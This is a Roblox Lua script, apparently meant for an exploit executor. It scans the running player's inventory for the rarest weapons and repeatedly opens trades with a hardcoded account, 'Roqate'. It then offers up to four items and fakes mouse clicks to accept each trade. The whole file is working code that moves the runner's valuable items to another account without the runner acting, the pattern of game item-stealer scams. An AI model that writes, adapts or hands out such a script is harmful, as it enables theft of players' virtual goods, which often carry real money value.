local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 2
local ITEM_ADD_DELAY = 0.5
local ACCEPT_DELAY = 1

-- Rarity priority
local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem")
}

-- Get inventory
local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

-- Get top weapons
local function getTop4Weapons()
    local inv = getCorrectMyInventory()
    if not inv then return {} end

    local candidates = {}
    for _, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(candidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    table.sort(candidates, function(a,b) return a.priority < b.priority end)
    
    local picked = {}
    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, candidates[i].name)
    end
    return picked
end

-- Find accept button
local function findAcceptButton()
    local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
    if not gui then return nil end
    
    -- Search for accept button
    for _, v in ipairs(gui:GetDescendants()) do
        if v:IsA("TextButton") and string.match(string.lower(v.Text), "accept") then
            return v
        end
    end
    return nil
end

-- Click button
local function clickButton(button)
    if button then
        for _ = 1, 2 do -- Double click
            game:GetService("VirtualInputManager"):SendMouseButtonEvent(
                button.AbsolutePosition.X + button.AbsoluteSize.X/2,
                button.AbsolutePosition.Y + button.AbsoluteSize.Y/2,
                0, true, button, 0
            )
            task.wait(0.1)
            game:GetService("VirtualInputManager"):SendMouseButtonEvent(
                button.AbsolutePosition.X + button.AbsoluteSize.X/2,
                button.AbsolutePosition.Y + button.AbsoluteSize.Y/2,
                0, false, button, 0
            )
            task.wait(0.1)
        end
        return true
    end
    return false
end

-- Wait for accept state
local function waitForAcceptState(button)
    local startTime = os.clock()
    local originalColor = button.BackgroundColor3
    
    while os.clock() - startTime < 20 do
        -- Check if button color changed
        if button.BackgroundColor3 ~= originalColor then
            return true
        end
        
        -- Check for "player accepted" message
        for _, v in ipairs(button.Parent:GetDescendants()) do
            if v:IsA("TextLabel") and string.find(string.lower(v.Text), "player has accepted") then
                return true
            end
        end
        
        task.wait(0.2)
    end
    return false
end

-- Main trade cycle
local function doTradeCycle(targetPlayer)
    print("\n=== Starting trade cycle ===")
    
    -- Send request
    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    if not success then
        warn("Trade request failed:", err)
        return
    end
    print("Sent trade request to", targetPlayer.Name)
    
    -- Wait for GUI
    local startTime = os.clock()
    local gui
    repeat
        gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        task.wait(0.2)
    until gui or os.clock() - startTime > 5
    
    if not gui then
        warn("Trade GUI not found")
        return
    end
    
    -- Add items
    local weapons = getTop4Weapons()
    if #weapons > 0 then
        print("Adding items:", table.concat(weapons, ", "))
        for _, weapon in ipairs(weapons) do
            pcall(function()
                TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
            end)
            task.wait(ITEM_ADD_DELAY)
        end
    end
    
    -- Find accept button
    local acceptButton
    startTime = os.clock()
    repeat
        acceptButton = findAcceptButton()
        task.wait(0.2)
    until acceptButton or os.clock() - startTime > 5
    
    if not acceptButton then
        warn("Accept button not found")
        return
    end
    
    -- Wait for accept state
    print("Waiting for accept state...")
    if waitForAcceptState(acceptButton) then
        print("Accepting trade")
        clickButton(acceptButton)
    else
        warn("Timeout waiting for accept state")
    end
    
    print("Trade cycle completed\n")
end

-- Main loop
while task.wait(TRADE_COOLDOWN) do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    else
        print("Waiting for", TARGET_PLAYER)
    end
end
